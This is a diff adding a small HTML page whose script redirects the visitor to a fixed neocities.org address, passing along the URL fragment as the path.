@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Redirecting...</title>
+</head>
+
+<body>
+Redirecting...
+
+<script>
+try {
+    const hash = window.location.hash.substring(1);
+
+    if (hash) {
+        const newUrl = "https://zethazyjhzsetyutyyu.neocities.org/" + hash;
+        window.location.replace(newUrl);
+    } else {
+        window.location.replace("https://zethazyjhzsetyutyyu.neocities.org/");
+    }
+} catch(e) {
+    window.location.replace("https://zethazyjhzsetyutyyu.neocities.org/");
+}
+</script>
+
+</body>
+</html>
